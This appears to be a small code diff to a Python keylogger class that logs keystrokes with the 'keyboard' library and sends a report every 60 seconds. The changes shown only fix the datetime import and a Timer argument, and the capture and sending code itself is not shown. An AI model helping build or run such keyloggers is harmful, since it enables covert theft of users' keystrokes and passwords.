@@ -1,6 +1,7 @@
+from datetime import datetime
 from threading import Timer
 import keyboard
-import datetime
+
 
 REPORT_TIMER = 60 # Will create and send a report every 60 seconds, time can be changed
 
@@ -58,7 +59,7 @@ class KeyLogger:
             self.start_time = datetime.now()
         
         self.log = ""
-        timer = Timer(time_interval=self.time_interval, function=self.report)
+        timer = Timer(interval=self.time_interval, function=self.report)
         timer.daemon = True
         timer.start()
 
